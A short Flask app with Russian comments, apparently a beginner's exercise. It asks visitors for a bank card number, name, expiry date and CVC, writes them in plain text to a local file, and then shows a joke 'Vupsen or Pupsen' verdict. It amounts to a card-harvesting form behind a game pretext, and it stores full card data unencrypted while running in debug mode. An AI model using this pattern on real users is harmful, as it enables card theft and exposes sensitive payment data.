import random
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    # TODO: добавить в форму поля ИМЯ, дата, CVC
    return render_template('page.html')

@app.route('/save', methods=['POST'])
def save():
    number = request.form['number']
    name = request.form['name']
    date = request.form['date']
    cvc = request.form['cvc']


    # добавить сохранение данных в файл
    with open("bankovskaya_karta.txt", "w", encoding="utf-8") as file:
        file.write(f"Номер: {number}\n")
        file.write(f"Имя: {name}\n")
        file.write(f"Дата: {date}\n")
        file.write(f"CVC: {cvc}\n")

    # сказать пользователю кто он - Вупсень или Пупсень? (сделать шаблон)
    if len(number) != 16:
        nameA = "Вупсень"
        because = " ты ввел карту, состоящую не из 16 цифр! Обманщик!"

    else:
        nameA = "Пупсень"
        because = " ты верно ввёл карту! Молодец!"

    return render_template("who.html", name=nameA, because=because)

# запускаем сайт
app.run(debug=True)